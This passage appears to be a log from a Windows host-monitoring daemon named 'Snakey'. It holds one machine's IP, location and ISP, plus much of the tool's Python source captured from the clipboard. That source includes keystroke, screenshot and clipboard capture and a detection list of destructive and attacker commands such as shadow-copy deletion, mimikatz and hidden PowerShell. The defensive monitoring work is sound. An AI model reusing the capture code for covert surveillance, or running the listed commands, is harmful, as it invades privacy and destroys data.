os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\", encoding='utf-8') as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed (list of hashes -> list of dicts)\r\n                    if ledger and isinstance(ledger[0], str):\r\n                        logger.info(\"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": datetime.now(timezone.utc).isoformat(), # Use current time for legacy entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        logger.info(\"Legacy hash ledger converted successfully.\")\r\n                except json.JSONDecodeError:\r\n                    logger.warning(\"Existing hash ledger file is corrupt. Starting with empty ledger.\", extra={\"file_path\": hash_ledger_path})\r\n                    ledger = []\r\n                except Exception as e:\r\n                    logger.error(f\"Error loading/converting hash ledger: {e}. Starting with empty ledger.\", exc_info=True, extra={\"file_path\": hash_ledger_path})\r\n                    ledger = [] # Start fresh on unexpected error\r\n\r\n            # Determine previous_encrypted_file_hash robustly\r\n            previous_encrypted_file_hash = \"0\" * 64\r\n            if ledger:\r\n                last_entry = ledger[-1]\r\n                if isinstance(last_entry, dict) and \"encrypted_file_hash\" in last_entry:\r\n                    previous_encrypted_file_hash = last_entry[\"encrypted_file_hash\"]\r\n                else:\r\n                    logger.warning(\"Last entry in hash ledger is malformed or missing 'encrypted_file_hash'. Using default previous hash ('0'*64).\", extra={\"last_ledger_entry\": str(last_entry)}) # Convert last_entry to str to avoid issues if it's complex/non-serializable\r\n            \r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            # Save the updated ledger (Atomic Write)\r\n            temp_ledger_path = os.path.join(base_path, \"hash_ledger_temp.json\")\r\n            try:\r\n                with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f:\r\n                    json.dump(ledger, temp_f, indent=4)\r\n                shutil.move(temp_f.name, hash_ledger_path)\r\n                logger.info(\"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n            except Exception as e:\r\n                logger.error(f\"Atomic write failed for hash ledger: {e}\", exc_info=True, extra={\"temp_path\": temp_ledger_path, \"target_path\": hash_ledger_path})\r\n                session_log[\"alerts\"].append(f\"Failed to update hash ledger atomically: {e}\")\r\n                if os.path.exists(temp_f.name):\r\n                    os.remove(temp_f.name)\r\n                # Fallback: try non-atomic write (less safe)\r\n                try:\r\n                    with open(hash_ledger_path, \"w\", encoding='utf-8') as f:\r\n                        json.dump(ledger, f, indent=4)\r\n                    logger.warning(\"Hash ledger updated with non-atomic write due to previous error.\", extra={\"target_path\": hash_ledger_path})\r\n                except Exception as fallback_e:\r\n                    logger.error(f\"Failed to write hash ledger even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": hash_ledger_path})\r\n                    session_log[\"alerts\"].append(f\"CRITICAL: Failed to write hash ledger even with fallback: {fallback_e}\")\r\n\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger if \"encrypted_file_hash\" in entry]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            if merkle_root:\r\n                # Save the Merkle root (Atomic Write)\r\n                temp_merkle_path = os.path.join(base_path, \"merkle_root_temp.txt\")\r\n                try:\r\n                    with tempfile.NamedTemporaryFile(mode='w', delete=False, dir=base_path, encoding='utf-8') as temp_f_merkle:\r\n                        temp_f_merkle.write(merkle_root)\r\n                    shutil.move(temp_f_merkle.name, merkle_root_path)\r\n                    logger.info(\"Merkle root saved (based on encrypted file hashes).\")\r\n                except Exception as e:\r\n                    logger.error(f\"Atomic write failed for Merkle root: {e}\", exc_info=True, extra={\"temp_path\": temp_merkle_path, \"target_path\": merkle_root_path})\r\n                    session_log[\"alerts\"].append(f\"Failed to save Merkle root atomically: {e}\")\r\n                    if os.path.exists(temp_f_merkle.name):\r\n                        os.remove(temp_f_merkle.name)\r\n                    # Fallback\r\n                    try:\r\n                        with open(merkle_root_path, \"w\", encoding='utf-8') as f:\r\n                            f.write(merkle_root)\r\n                        logger.warning(\"Merkle root updated with non-atomic write due to previous error.\", extra={\"target_path\": merkle_root_path})\r\n                    except Exception as fallback_e:\r\n                        logger.error(f\"Failed to write Merkle root even with fallback: {fallback_e}\", exc_info=True, extra={\"target_path\": merkle_root_path})\r\n                        session_log[\"alerts\"].append(f\"CRITICAL: Failed to write Merkle root even with fallback: {fallback_e}\")\r\n            else:\r\n                logger.warning(\"Merkle root could not be built (no hashes).\")\r\n\r\n\r\n        except Exception as e:\r\n            logger.error(f\"Failed to update hash ledger or Merkle root: {e}\", exc_info=True)\r\n            session_log[\"alerts\"].append(f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        logger.error(f\"Encryption or encrypted file save error: {e}\", exc_info=True)\r\n\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    logger.info(\"Starting Snakey in daemon mode...\")\r\n\r\n    # Start keylogger in a separate, persistent daemon thread\r\n    keylogger_thread = threading.Thread(target=keylogger_thread_func, daemon=True)\r\n    keylogger_thread.start()\r\n    logger.info(\"Keylogger thread initialized.\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        logger.info(\"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            logger.error(f\"Failed to remove existing stop file: {e}\", exc_info=True)\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            logger.info(\"Snakey terminated by stop_snakey.txt file.\")\r\n            # Gracefully stop keylogger thread\r\n            if KEYLOGGER_LISTENER:\r\n                logger.info(\"Stopping keylogger listener.\")\r\n                KEYLOGGER_LISTENER.stop()\r\n            break # Exit main loop\r\n\r\n        try:\r\n            session_log = collect_full_session() # Gathers all data, encrypts, updates ledger\r\n\r\n            # Send data to Elasticsearch (if connected)\r\n            send_to_elasticsearch(session_log)\r\n\r\n            # Save data to local JSON log file\r\n            save_session_to_json(session_log, json_log_path)\r\n\r\n            # Log to Wazuh-compatible file\r\n            log_to_wazuh_file(session_log)\r\n\r\n        except Exception as e:\r\n            logger.critical(f\"An unhandled error occurred in the main daemon loop: {e}\", exc_info=True)\r\n            # No `extra` here, as this is the top-level handler\r\n            session_log[\"alerts\"].append(f\"CRITICAL: Unhandled error in main loop: {e}\") # Add to log if possible\r\n\r\n        # Sleep for the configured interval\r\n        logger.info(f\"Sleeping for {config['time_sleep_seconds']} seconds before next collection at {datetime.now(timezone.utc).isoformat()}...\")\r\n        time.sleep(config['time_sleep_seconds'])\r\n\r\n    logger.info(\"Snakey daemon has stopped.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "7bc953bbeac424b0f7d619989809cc46fb5a20586088b9b928a23e5c1b18d547", "screenshot_hash": "948be819fbbdbc6ec6f3691d4a1e90be3ae741524cfda5b25ff56cd7a90fc728", "_raw_log_hash": "bd495be92b5725442b4c58fe97ec1c462ef5d16880bcb842968f44bb402ffa73"}
{"timestamp": "2025-06-11T17:09:14.050635+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport sys\r\nimport threading\r\nimport shutil\r\nimport traceback\r\nimport logging\r\nfrom logging.handlers import RotatingFileHandler, TimedRotatingFileHandler\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get as requests_get, post as requests_post # Renamed to avoid conflict with `get` from `requests`\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Still needed for general requests like ipinfo.io\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException, TransportError\r\nimport ssl # Not directly used for client, but good to have\r\nimport tempfile # For atomic writes\r\n\r\n\r\n# === Configuration Loading ===\r\n# Default configuration values\r\nDEFAULT_CONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"known_countries\": [\"Portugal\"], # Example country for testing\r\n    \"known_vpn_ips\": [\"89.214.145.78\", \"123.45.67.89\"], # Example VPN IPs\r\n    \"elastic_host\": \"localhost\",\r\n    \"elastic_port\": 9200,\r\n    \"log_level\": \"INFO\", # DEBUG, INFO, WARNING, ERROR, CRITICAL\r\n    \"time_sleep_seconds\": 3, # Main daemon loop sleep interval\r\n    \"min_free_disk_mb\": 100, # Minimum free disk space to operate\r\n    \"vt_api_key\": None, # Should be loaded from ENV\r\n    \"elastic_user\": None, # Should be loaded from ENV\r\n    \"elastic_password\": None # Should be loaded from ENV\r\n}\r\n\r\n# --- Paths derived from config ---\r\n# These will be set after config is loaded\r\nconfig = {} # Placeholder, will be populated by load_config\r\n\r\n# --- Global Keylogger Variables ---\r\nKEYLOGGER_KEYS = []\r\nKEYLOGGER_LISTENER = None # Will hold the pynput Listener instance\r\nKEYLOGGER_STOP_EVENT = threading.Event() # To signal the keylogger thread to stop\r\n\r\n# === Logger Setup (using Python's logging module) ===\r\n# This needs to be set up early before any `logger.info` calls\r\nlogger = logging.getLogger('snakey_daemon')\r\n\r\nclass JsonFormatter(logging.Formatter):\r\n    \"\"\"Custom JSON formatter for structured logs.\"\"\"\r\n    def format(self, record):\r\n        log_record = {\r\n            \"timestamp\": datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),\r\n            \"level\": record.levelname,\r\n            \"message\": record.getMessage(),\r\n            \"logger_name\": record.name,\r\n        }\r\n        if record.exc_info:\r\n            log_record[\"exception\"] = self.formatException(record.exc_info)\r\n        if record.funcName:\r\n            log_record[\"function\"] = record.funcName\r\n        if record.lineno:\r\n            log_record[\"line\"] = record.lineno\r\n        if record.pathname:\r\n            log_record[\"file\"] = record.pathname\r\n        \r\n        # Add any extra dictionary fields passed to the logger via the 'extra' keyword\r\n        if hasattr(record, 'extra') and isinstance(record.extra, dict):\r\n            # The 'extra' dictionary contains the keys directly, so just update\r\n            log_record.update(record.extra)\r\n\r\n        return json.dumps(log_record, default=str) # default=str handles datetime, etc.\r\n\r\ndef setup_logging(log_level_str, log_file_path):\r\n    \"\"\"Configures the main logger for the daemon.\"\"\"\r\n    try:\r\n        logger.setLevel(getattr(logging, log_level_str.upper()))\r\n    except AttributeError:\r\n        logger.setLevel(logging.INFO) # Default to INFO if level is invalid\r\n        logger.warning(f\"Invalid SNAKEY_LOG_LEVEL '{log_level_str}'. Defaulting to INFO.\")\r\n\r\n    # Prevent adding handlers multiple times if setup_logging is called more than once\r\n    if not logger.handlers:\r\n        # File Handler with Time-based Rotation (daily)\r\n        file_handler = TimedRotatingFileHandler(log_file_path,\r\n                                                when=\"midnight\",\r\n                                                interval=1, # Rotate daily\r\n                                                backupCount=5) # Keep up to 5 rotated log files\r\n        file_handler.setLevel(logging.DEBUG) # Log all debug messages to file\r\n        file_handler.setFormatter(JsonFormatter())\r\n        logger.addHandler(file_handler)\r\n\r\n        # Console Handler\r\n        console_handler = logging.StreamHandler(sys.stdout)\r\n        console_handler.setLevel(logging.INFO) # Only INFO and above to console\r\n        console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\r\n        console_handler.setFormatter(console_formatter)\r\n        logger.addHandler(console_handler)\r\n\r\n# Global exception handler to log any unhandled exceptions\r\ndef handle_unhandled_exception(exc_type, exc_value, exc_traceback):\r\n    if issubclass(exc_type, KeyboardInterrupt):\r\n        # Don't log KeyboardInterrupt, let default handler deal with it\r\n        sys.__excepthook__(exc_type, exc_value, exc_traceback)\r\n        return\r\n    logger.critical(\"Unhandled exception caught!\", exc_info=(exc_type, exc_value, exc_traceback))\r\n\r\nsys.excepthook = handle_unhandled_exception\r\n\r\ndef load_config(config_file_path: str) -> dict:\r\n    \"\"\"Loads configuration from a JSON file and environment variables.\"\"\"\r\n    loaded_config = DEFAULT_CONFIG.copy()\r\n\r\n    if os.path.exists(config_file_path):\r\n        try:\r\n            with open(config_file_path, \"r\", encoding='utf-8') as f:\r\n                file_config = json.load(f)\r\n                loaded_config.update(file_config)\r\n            logger.info(f\"Configuration loaded from {config_file_path}\")\r\n        except json.JSONDecodeError:\r\n            logger.error(f\"Error decoding config file {config_file_path}. Using default values.\")\r\n        except IOError as e:\r\n            logger.error(f\"Error reading config file {config_file_path}: {e}. Using default values.\")\r\n        except Exception as e:\r\n            logger.critical(f\"Unexpected error parsing config file: {e}\", exc_info=True)\r\n            sys.exit(1) # Critical error, exit\r\n\r\n    # Override with Environment Variables for sensitive info (best practice)\r\n    loaded_config[\"vt_api_key\"] = os.getenv(\"SNAKEY_VT_API_KEY\", loaded_config[\"vt_api_key\"])\r\n    loaded_config[\"elastic_user\"] = os.getenv(\"SNAKEY_ELASTIC_USER\", loaded_config[\"elastic_user\"])\r\n    loaded_config[\"elastic_password\"] = os.getenv(\"SNAKEY_ELASTIC_PASSWORD\", loaded_config[\"elastic_password\"])\r\n    loaded_config[\"log_level\"] = os.getenv(\"SNAKEY_LOG_LEVEL\", loaded_config[\"log_level\"]).upper()\r\n\r\n    return loaded_config\r\n\r\n# === Global Variables (Initialized after config loading) ===\r\nconfig_file = os.path.join(DEFAULT_CONFIG[\"base_path\"], \"snakey_config.json\")\r\nconfig = load_config(config_file)\r\n\r\n# Now define paths and settings using the loaded config\r\nbase_path = config[\"base_path\"]\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True) # Ensure directory exists\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon.log\") # Changed name to avoid conflict with existing (error) log\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = set(config[\"known_countries\"]) # Use set for faster lookups\r\nKNOWN_VPN_IPS = set(config[\"known_vpn_ips\"]) # Use set for faster lookups\r\nMIN_FREE_DISK_MB = config[\"min_free_disk_mb\"]\r\n\r\n# --- VirusTotal API Endpoints (Global Constants) ---\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\n\r\n\r\n# Sensitive Command Detection Configuration\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\", \"del /s /q\", \"rmdir /s /q\", \"net user\", \"net localgroup administrators\",\r\n    \"taskkill /f /im\", \"schtasks /create\", \"reg delete\", \"mimikatz\",\r\n    \"certutil -urlcache -f -split\", \"wmic shadowcopy delete\", \"vssadmin delete shadows\",\r\n    \"powershell -nop -w hidden -c\", \"invoke-expression\", \"set-mppreference -disablerealtimemonitoring $true\",\r\n    \"bcdedit /set {current} safeboot network\", \"mshta.exe http\", \"bitsadmin /transfer\",\r\n    \"wevtutil cl system\", \"cipher /w\", \"sdelete -z\",\r\n]\r\n\r\n# === Setup Logging (now that config is loaded) ===\r\nsetup_logging(config[\"log_level\"], daemon_log_file)\r\n\r\n\r\n# === Encryption Key Loading ===\r\nfernet: Fernet = None # Type hint\r\nif not os.path.exists(key_path):\r\n    logger.critical(\"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    sys.exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    logger.info(\"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    logger.critical(f\"Failed to load encryption key: {e}. Exiting.\", exc_info=True)\r\n    sys.exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = config[\"elastic_host\"]\r\nELASTIC_PORT = config[\"elastic_port\"]\r\nELASTIC_USER = config[\"elastic_user\"]\r\nELASTIC_PASSWORD = config[\"elastic_password\"]\r\n\r\nes_client: Elasticsearch = None # Type hint\r\n\r\n# Basic pre-check before initializing the full ES client\r\nes_precheck_successful = False\r\nlogger.info(\"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\nif not ELASTIC_USER or not ELASTIC_PASSWORD:\r\n    logger.critical(\"Elasticsearch username or password not set (check SNAKEY_ELASTIC_USER/SNAKEY_ELASTIC_PASSWORD environment variables or config file). Elasticsearch client will not be initialized.\")\r\nelse:\r\n    try:\r\n        response = requests_get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                                verify=False, timeout=10, stream=True)\r\n        logger.debug(f\"Basic requests.get status: {response.status_code}\")\r\n        # Read a byte to force connection establishment, then close to prevent hanging\r\n        try:\r\n            response.raw.read(1)\r\n        except Exception as read_e:\r\n            logger.warning(f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\", extra={\"error_type\": \"requests_raw_read_error\"})\r\n        response.close()\r\n        if response.status_code == 200:\r\n            logger.info(\"Basic requests.get pre-check successful (status 200).\")\r\n            es_precheck_successful = True\r\n        else:\r\n            logger.warning(\r\n                f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\",\r\n                extra={\"http_status\": response.status_code, \"response_text\": response.text})\r\n\r\n    except requests.exceptions.ConnectionError as e:\r\n        logger.error(f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\", exc_info=True, extra={\"error_type\": \"requests_connection_error\"})\r\n    except requests.exceptions.Timeout:\r\n        logger.error(\"requests.Timeout during pre-check: Connection timed out.\", exc_info=True, extra={\"error_type\": \"requests_timeout\"})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\", exc_info=True, extra={\"error_type\": \"requests_request_error\"})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during basic requests pre-check: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_precheck_error\"})\r\n\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # WARNING: Disable for testing, enable for production!\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            logger.info(\"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            logger.error(\"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\", extra={\"error_type\": \"es_ping_failed\"})\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        logger.error(f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\", exc_info=True, extra={\"error_type\": \"es_connection_error\"})\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        logger.error(f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\", exc_info=True, extra={\"error_type\": \"es_auth_error\"})\r\n        es_client = None\r\n    except TransportError as e:\r\n        logger.error(f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\", exc_info=True, extra={\"error_type\": \"es_transport_error\", \"status_code\": e.status_code})\r\n        es_client = None\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during Elasticsearch client initialization: {e}\", exc_info=True, extra={\"error_type\": \"unexpected_es_init_error\"})\r\n        es_client = None\r\nelse:\r\n    logger.warning(\"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath: str) -> str | None:\r\n    \"\"\"Calculates the SHA256 hash of a file.\"\"\"\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        logger.error(f\"File not found for hashing: {filepath}\", extra={\"file_path\": filepath})\r\n        return None\r\n    except Exception as e:\r\n        logger.error(f\"Hashing failed for {filepath}: {e}\", exc_info=True, extra={\"file_path\": filepath})\r\n        return None\r\n\r\n\r\ndef hash_text(text: str) -> str:\r\n    \"\"\"Calculates the SHA256 hash of a given string.\"\"\"\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes: list[str]) -> str | None:\r\n    \"\"\"Builds a Merkle tree from a list of hashes and returns the Merkle root.\"\"\"\r\n    if not hashes:\r\n        return None\r\n    hashes = list(hashes) # Make a mutable copy\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url: str) -> dict:\r\n    \"\"\"Performs a VirusTotal URL lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping URL lookup.\", extra={\"url\": url})\r\n            return {}\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests_get(f\"{VT_URL_LOOKUP}{url_id}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\", extra={\"url_hash\": url_id})\r\n        else:\r\n            logger.warning(f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\", extra={\"url\": url, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT URL lookup failed: {e}\", exc_info=True, extra={\"url\": url})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT URL lookup: {e}\", exc_info=True, extra={\"url\": url})\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path: str) -> dict:\r\n    \"\"\"Performs a VirusTotal file lookup.\"\"\"\r\n    try:\r\n        if not config.get(\"vt_api_key\"): # Use .get() for safer access\r\n            logger.warning(\"VirusTotal API key not configured. Skipping File lookup.\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        if not os.path.exists(file_path):\r\n            logger.error(f\"File not found for VT lookup: {file_path}\", extra={\"file_path\": file_path})\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:\r\n            return {}\r\n\r\n        response = requests_get(f\"{VT_FILE_LOOKUP}{file_hash}\", headers={\"x-apikey\": config[\"vt_api_key\"]}, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            logger.warning(f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\", extra={\"file_hash\": file_hash, \"file_path\": file_path})\r\n        else:\r\n            logger.warning(f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\", extra={\"file_path\": file_path, \"status_code\": response.status_code, \"response_text\": response.text})\r\n    except requests.exceptions.RequestException as e:\r\n        logger.error(f\"VT File lookup failed: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    except Exception as e:\r\n        logger.error(f\"Unexpected error during VT File lookup: {e}\", exc_info=True, extra={\"file_path\": file_path})\r\n    return {}\r\n\r\n\r\ndef check_important_directories() -> dict[str, str]:\r\n    \"\"\"Checks the status of important user directories.\"\"\"\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n                logger.warning(f\"Failed to list contents of {name} ({path}): {e}\", extra={\"dir_name\": name, \"dir_path\": path})\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file() -> bool:\r\n    \"\"\"Checks if the 'stop_snakey.txt' file exists to terminate the daemon.\"\"\"\r\n    return 